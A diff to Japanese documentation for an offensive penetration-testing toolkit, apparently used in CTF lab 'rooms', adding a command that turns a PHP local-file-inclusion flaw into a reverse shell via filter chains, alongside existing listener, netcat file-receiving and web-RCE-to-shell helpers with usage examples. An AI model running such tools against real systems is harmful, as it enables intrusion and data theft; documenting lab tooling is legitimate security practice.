@@ -533,6 +533,7 @@ msfr -m exploit/... -u user --creds --stay
 | `listen -l [port]` | 接続ログを `cases/.../logs/revshell_*` に保存 |
 | `listen -d [port]` | `tar` ストリームを受信して `cases/<room>/exports/listen_<ts>/` に展開（`nc -lvnp PORT | tar xf - -C ...`）。ターゲット側の送信コマンドも表示 |
 | `webrsh [options] [path\|url]` | Web RCE → revshell（`?cmd=` / POST）。LHOST は `tun0` → `eth0` 自動。`-u user[:pass]` で HTTP Basic（pass 省略時は `cl`） |
+| `lfish [options] [path\|url]` | LFI/php://filter include → revshell。PHP filter chain を内部生成し、既定 `LHOST=lhost`、`LPORT=4444`、方式は `proc`（`-t proc|bash|nc` で切替） |
 
 `ftp-revshell` の前に **別ターミナルで `listen`** を起動する。
 
@@ -577,6 +578,9 @@ ftp-revshell
 # または
 ftp-revshell -d ftp -w /files
 ftp-revshell -U http://10.49.140.156/files/ftp/shell.php -u
+lfish http://$IP/secret-script.php -p file
+lfish /secret-script.php -p file -t bash
+lfish /secret-script.php -p page -X POST -P 5555
 ```
 
 詳細: `ftp-revshell -h`
@@ -892,6 +896,7 @@ sshkey-crack -h
 gpg-crack -h
 upload-shell -h
 webrsh -h
+lfish -h
 msfr -h
 postcmd -h
 enc -h
